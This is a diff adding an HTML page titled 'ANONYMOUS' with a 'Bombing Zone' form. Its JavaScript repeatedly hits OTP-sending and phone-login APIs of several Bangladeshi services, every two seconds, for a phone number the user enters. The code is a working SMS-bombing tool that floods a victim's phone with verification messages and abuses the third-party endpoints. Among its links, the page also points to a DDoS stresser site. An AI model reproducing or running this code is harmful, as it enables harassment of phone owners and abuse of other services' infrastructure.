@@ -1,0 +1,326 @@
+<!doctype html>
+<html> 
+ <head> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
+  <title>𝙰𝙽𝙾𝙽𝚈𝙼𝙾𝚄𝚂</title> 
+  <style>
+    /* সিএসএস স্টাইল এখানে লিখুন */
+
+    body {
+      background-color: black;
+      color: white;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+    }
+
+      .container {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      height: 45vh;
+      border:1px solid white;
+      margin-top: -10px;
+      padding:0px;
+    }
+ .tools{
+ 
+  color: ;
+  border: 1px solid red;
+  margin-top: 5px;
+  }
+
+    .fun-box {
+      background-color: black;
+      color: white;
+      border: 2px solid red;
+      text-align: center;
+      padding: 10px;
+      margin: 20px auto;
+      border-color: red;
+      font-size: 24px;
+    }
+  #facebook-button {
+      background-color: #FACC2E;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      text-decoration: none;
+      font-size: 14px; 
+      margin: 4px 2px;
+      cursor: pointer;
+}
+
+#result-button {
+      background-color: green;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      text-decoration: none;
+      font-size: 14px; 
+      margin: 4px 2px;
+      cursor: pointer;
+}
+#web-button {
+      background-color: red;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      text-decoration: none;
+      font-size: 14px; 
+      margin: 4px 2px;
+      cursor: pointer;
+}
+.web{
+    border:1px solid white;
+    margin-Top: 5px;
+}
+#yt-button {
+      background-color: #B40404;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      text-decoration: none;
+      font-size: 14px; 
+      margin: 4px 2px;
+      cursor: pointer;
+}
+
+#facebook-button {
+      background-color: #FACC2E;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      text-decoration: none;
+      font-size: 14px; 
+      margin: 4px 2px;
+      cursor: pointer;
+}
+
+
+#orginal-facebook-button {
+      background-color: #00BFFF;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      text-decoration: none;
+      font-size: 14px; 
+      margin: 4px 2px;
+      cursor: pointer; 
+}
+
+     #stop-button {
+      background-color: red;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 18px;
+      margin: 4px 2px;
+      cursor: pointer;
+      font-size: 24px;
+    }
+
+    #submit-button {
+      background-color:#0431B4;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 18px;
+      margin: 4px 2px;
+      cursor: pointer;
+      font-size: 24px;
+    }
+
+    #middle-box {
+      background-color: black;
+      border: 2px solid green;
+      padding: 20px;
+      margin: 20px auto;
+      font-size: 24px;
+    }
+
+    /* সম্পূর্ণ সান্দর্ভিক বক্স */
+    .custom-box {
+      background-color: black; /* ব্যাকগ্রাউন্ড কালো করুন */
+      color: white;
+      padding: 20px; /* প্যাডিং বড় করুন */
+      font-size: 28px; /* ফন্ট সাইজ বড় করুন */
+      text-align: center;
+      width: 70%; /* বক্সের প্রস্থ বড় করুন */
+      margin: 0 auto; /* মার্জিন সেন্টার */
+      border: none; /* বর্ডার বাতিল করুন */
+    }
+
+    /* ইনপুট ফর্ম স্টাইল */
+    #phone-number {
+      font-size: 20px; /* ফন্ট সাইজ বড় করুন */
+      padding: 10px; /* প্যাডিং বড় করুন */
+      width: 70%; /* ইনপুট ফর্মের প্রস্থ বড় করুন */
+      border: 2px solid red; /* বর্ডার স্টাইল */
+      background-color: #333; /* ব্যাকগ্রাউন্ড কালো করুন */
+      color: white;
+    }
+
+    @media screen and (max-width: 600px) {
+      body {
+        font-size: 16px;
+      }
+
+      .fun-box {
+        font-size: 14px;
+      }
+
+      #stop-button {
+        font-size: 16px;
+        padding: 10px 20px;
+      }
+
+      #submit-button {
+        font-size: 16px;
+        padding: 10px 20px;
+      }
+
+      #telegram-button {
+        font-size: 16px;
+        padding: 10px 20px;
+      }
+
+      #middle-box {
+        font-size: 14px;
+      }
+    }
+  </style> 
+ </head> 
+ <body> 
+     <div class="bombing">
+  <div class="container"> 
+   <h3>𝔹𝕠𝕞𝕓𝕚𝕟𝕘 ℤ𝕠𝕟𝕖</h3> 
+   <form id="api-call-form"> 
+    <input type="text" id="phone-number" placeholder="Enter Phone Number"> 
+    <br>
+  <button id="submit-button" type="button">Start</button> 
+  <button id="stop-button" type="button">Stop</button> 
+  <br>
+  </div> 
+  <div class="tools">
+      <a id="orginal-facebook-button" href="https://fast.com/#">Speed test</a> 
+        <a id="orginal-facebook-button" href="https://stresser.su/hub ">DDOS</a> 
+        <a id="orginal-facebook-button" href="https://m.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzE1NDI2NTA1LCJjYWxsc2l0ZV9pZCI6NDc4NzQ0MjE2MzY0ODU4fQ%3D%3D&c=%2Flogin%2F&fl=facebook_login&ctx=strong_rec_try_another_way&ars=facebook_login&ram=whatsapp">Facebook</a> 
+   <a id="yt-button" href="https://teamcsb.com/">Team CSB</a>
+   <a id="yt-button" href="https://en.y2mate.is/v39/">YT Downloader</a> 
+  <a id="facebook-button" href="https://iumss.baiust.ac.bd/">IUMSS</a>
+  <a id="facebook-button" href="http://opac.baiust.ac.bd/cgi-bin/koha/opac-user.pl">OPAC</a>  
+   <a id="facebook-button" href="https://temp-mail.io/en ">Temp Mail</a> 
+   <a id="result-button" href="https://eboardresults.com/en/ebr.app/home/">Result - 1</a> 
+  <a id="result-button" href="http://www.educationboardresults.gov.bd/">Result - 2</a>  
+   </form> 
+  </div> 
+ <div class="web">  
+     <a id="web-button" href="https://gokutv.pics/">Movie</a> 
+     
+       <a id="web-button" href="https://mlwbd.do/ ">MLWBD</a>  
+       
+       
+       <a id="web-button" href="https://m.imdb.com/ ">IMDB</a> 
+ </div>
+  
+  
+  <script>
+      function callAPI(apiURL) {
+  fetch(apiURL)
+    .then(response => response.json())
+    .then(data => {
+    
+      console.log(`API কল সফল: ${apiURL}`, data);
+    })
+    .catch(error => {
+    
+      console.error(`API কল ব্যর্থ: ${apiURL}`, error);
+    });
+}
+
+const apiCallForm = document.getElementById('api-call-form');
+const phoneNumberInput = document.getElementById('phone-number');
+const submitButton = document.getElementById('submit-button');
+const stopButton = document.getElementById('stop-button');
+
+submitButton.addEventListener('click', () => {
+  const phoneNumber = phoneNumberInput.value;
+
+  startAPICalls(phoneNumber);
+});
+
+stopButton.addEventListener('click', () => {
+
+  stopAPIs();
+});
+
+
+function startAPICalls(phoneNumber) {
+  let intervalId;
+  let stopAPIs = false;
+
+  if (!phoneNumber) {
+    alert('Please Provide a Number');
+    return;
+  }
+
+
+  intervalId = setInterval(() => {
+    if (!stopAPIs) {
+      callAPI(`https://apibeta.iqra-live.com/api/v1/sent-otp/${phoneNumber}`);
+ 
+ callAPI(`https://ultranetrn.com.br/fonts/api.php?number=${phoneNumber}`); 
+      callAPI(`https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${phoneNumber}`);
+      callAPI(`https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${phoneNumber}`);
+      callAPI(`https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=${phoneNumber}`);
+      
+      callAPI(`https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${phoneNumber}`); 
+
+callAPI(`https://apibeta.iqra-live.com/api/v1/sent-otp/${phoneNumber}`);
+      callAPI(`https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=${phoneNumber}`);
+
+callAPI(`https://bot2-rho.vercel.app/api/kg?phone=${phoneNumber}`); 
+ callAPI(`https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${phoneNumber}`);
+      callAPI(`https://ultranetrn.com.br/fonts/api.php?number=${phoneNumber}`);
+      callAPI(`https://ultranetrn.com.br/fonts/api.php?number=${phoneNumber}`);
+      
+      callAPI(`https://apibeta.iqra-live.com/api/v1/sent-otp/${phoneNumber}`); 
+      callAPI(`https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=${phoneNumber}`);
+    } else {
+      clearInterval(intervalId);
+    }
+  }, 2000);
+}
+
+function stopAPIs() {
+  stopAPIs = true;
+}
+  </script>
+ </body>
+</html>
